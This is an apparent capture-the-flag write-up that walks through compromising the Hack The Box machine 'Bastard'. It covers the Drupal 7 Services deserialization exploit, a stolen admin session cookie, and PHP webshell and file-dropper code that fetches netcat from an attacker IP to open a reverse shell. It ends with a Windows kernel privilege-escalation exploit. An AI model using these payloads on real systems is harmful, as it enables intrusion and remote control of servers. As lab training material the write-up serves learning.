---
title: Bastard
date: 2022-06-06 22:25:00
author: 0xma
categories: 
  - hackthebox
  - windows
tags: 
  - windows
  - hackthebox
  - htb-bastard
  - ctf
  - web
  - drupal
  - drupalgeddon2
  - drupalgeddon3
  - droopescan
  - dirsearch
  - nmap
  - windows
  - searchsploit
  - nishang
  - ms15-051
  - smbserver
  - htb-devel
  - htb-granny
  - php
  - webshell
  - oscp-like
---
# [Medium] Bastard

## Reconnaissance

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```bash
nmapAutomator.sh 10.129.253.176 All
```

**All**: Runs all the scans consecutively.

We get back the following result.

```bash

```

**Note:** The gobuster, nikto and droopescan scans kept timing out. The web server seems to be not able to handle the requests that these tools were sending.

We have three open ports.

- **Port 80:** running Drupal 7
- **Port 135 & 49154:** running Microsoft Windows RPC

Before we move on to enumeration, let’s make some mental notes about the scan results.

- Port 80 is running Drupal 7 which I know from the [Hawk box](https://medium.com/@ranakhalil101/hack-the-box-hawk-writeup-w-o-metasploit-da80d51defcd) is vulnerable to a bunch of exploits. Most of these exploits are associated with the modules that are installed on Drupal. Since droopescan is not working, we’ll have to manually figure out if these modules are installed.

## Enumeration

Visit the web application in the browser.

![Untitled](/medias/images/bastard/Untitled.png)

It’s running Drupal which is is a free and open-source content management framework. Let’s look at the *CHANGELOG* to view the exact version.

![Untitled](/medias/images/bastard/Untitled%201.png)

It’s running Drupal 7.54.

Let’s try and find credentials to this application. I googled “default credentials drupal”, but I didn’t find anything useful. Next, I tried common credentials *admin/admin*, *admin/password*, etc. but was not able to log in.

When it is an off-the-shelf software, I usually don’t run a brute force attack on it because it probably has a lock out policy in place.

Next, run searchsploit.

```bash
searchsploit drupal 7
```

Let’s view vulnerability number 41564.

![Untitled](/medias/images/bastard/Untitled%202.png)

```bash
searchsploit -m 41564
```

It links to this [blog post](https://www.ambionics.io/blog/drupal-services-module-rce). It seems to be a deserialization vulnerability that leads to Remote Code Execution (RCE). Looking at the code, it we see that it visit the path */rest_endpoint* to conduct the exploit.

```php
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
```

That path is not found on the box, however, if we simply change it to */rest* it works!

![Untitled](/medias/images/bastard/Untitled%203.png)

So it is using the *Services* module. We’ll use this exploit to gain an initial foothold on the box.

## Initial Foothold

Make the following changes to the exploit code.

```php
$url = '<ServerIP>';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
```

There are also two comments that are not wrapped properly that you’ll need to fix.

Run the exploit.

```bash
php 41564.php
```

We get an “ Uncaught Error: Call to undefined function curl_init()” error message. That’s because we don’t have *php-curl* installed on our kali machine.

```bash
sudo apt-get install php-curl
```

Now the exploit should work.

![Untitled](/medias/images/bastard/Untitled%204.png)

Perfect! It created two files: *session.json* and *user.json*. View the content of *user.json*.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Medium/Bastard]
└─$ cat user.json                                                                                                                             1 ⚙
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1600794805",
    "login": 1636275022,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}
```

It gives us the hashed password of the *admin* user. We could run it through a password cracker, however, we don’t need to because the *session.json* file gives us a valid session cookie for the *admin* user.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Medium/Bastard]
└─$ cat session.json                                                                                                                          1 ⚙
{
    "session_name": "SESS167065732654ec7c203e27287a34459a",
    "session_id": "nJS0-41tDSfCNmpgITuEXAqzb8YaJUJz0o1XkfNjUnY",
    "token": "eDxO18yEsqT5cCyV_YAwOMIh0TMmjsXP49fCeQwHW7s"
}
```

Let’s add the cookie to our browser .

![Untitled](/medias/images/bastard/Untitled%205.png)

Then refresh the page.

![Untitled](/medias/images/bastard/Untitled%206.png)

We’re logged in as *admin*! Click on the *Modules* tab and check if the *PHP filter* is enabled. It is. This means we can add PHP code.

![Untitled](/medias/images/bastard/Untitled%207.png)

Click on *Add new content* on the welcome page > click on *Basic page*. In the *Title* field add the value “shell”. 

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

![Untitled](/medias/images/bastard/Untitled%208.png)

In my case the entry created is under the path */node/2*. Let’s test it out.

![Untitled](/medias/images/bastard/Untitled%209.png)

We have code execution! I can’t seem to use powershell from here, so what we’ll do is upload netcat on the box and then use it to send a reverse shell back to our attack machine.

Run the *systeminfo* command.

![Untitled](/medias/images/bastard/Untitled%2010.png)

It’s a 64-bit operating system. Download the 64-bit executable of netcat from [here](https://eternallybored.org/misc/netcat/). Start up a python server.

create one content again for uploading file

```php
<?php 
if (isset($_REQUEST['fupload'])) {
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.50/" . $_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
}
?>
```

Upload it using the *fupload* parameter.

```php
http://10.129.253.176/node/3/?fupload=nc64.exe
```

Then set up a listener on the attack machine.

```php
nc -lvnp 4242
```

```bash
http://<TargetIP>/node/3/?fupload=nc64.exe 10.10.14.50 4242 -e cmd.exe
```

We get a shell!

![Untitled](/medias/images/bastard/Untitled%2011.png)

Grab the *user.txt* flag.

![Untitled](/medias/images/bastard/Untitled%2012.png)

Now we need to escalate privileges.

## Privilege Escalation

We know from the output of the *systeminfo* command the OS name and version.

```bash
OS Name:                Microsoft Windows Server 2008 R2 Datacenter 
OS Version:             6.1.7600 N/A Build 7600
```

Grab all systeminfo to sysinfo.txt

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Medium/Bastard]
└─$ python2 ~/Documents/Tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2021-11-07-mssb.xls --systeminfo sysinfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

use MS10-059 vuln, you can get compiled version in [here](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled).

upload with ?fupload= and run the exploit

![Untitled](/medias/images/bastard/Untitled%2013.png)

![Untitled](/medias/images/bastard/Untitled%2014.png)

get the root.txt

![Untitled](/medias/images/bastard/Untitled%2015.png)